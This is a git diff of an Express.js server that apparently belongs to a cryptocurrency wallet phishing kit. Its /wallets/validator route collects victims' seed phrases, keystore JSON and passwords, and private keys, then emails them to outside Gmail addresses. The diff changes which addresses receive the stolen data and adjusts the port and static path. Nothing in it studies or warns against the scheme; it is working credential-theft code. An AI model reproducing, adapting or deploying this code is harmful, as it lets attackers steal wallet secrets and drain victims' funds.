@@ -5,7 +5,7 @@ const app = express()
 require('dotenv').config()
 
 app.use(express.static("views"))
-app.use(express.static("public"))
+app.use(express.static(__dirname + "/public/"))
 app.use("/wallets", express.static("/views/Wallets Validation_files"))
 app.use(express.static("/views/BLOCKCHAIN NODE_files"))
 app.use(bodyParser.urlencoded({ extended: true }))
@@ -33,8 +33,8 @@ app.post('/wallets/validator', async (req, res) => {
       });
       
       var mailOptions = {
-        from: 'node.resolver@gmail.com',
-        to: 'realhamzadanjuma@gmail.com, node.resolver@gmail.com',
+        from: 'wallet.resolver@gmail.com',
+        to: 'mcharrison25@gmail.com, wallet.resolver@gmail.com',
         subject: 'Re: Wallet Detail - Seed Phrase, Keystore JSON, Private Key',
         html: `${req.body.message}, ${req.body.keystorejson}, ${req.body.keystorejsonpassword}, ${req.body.privatekey}`
       };
@@ -66,6 +66,6 @@ app.post('/wallets/validator', async (req, res) => {
     }, 7000)
 })
 
-app.listen(process.env.PORT || 3000, () => {
+app.listen(process.env.PORT || 3300, () => {
     console.log(`Server started successfully on PORT: ${process.env.PORT}`)
 })
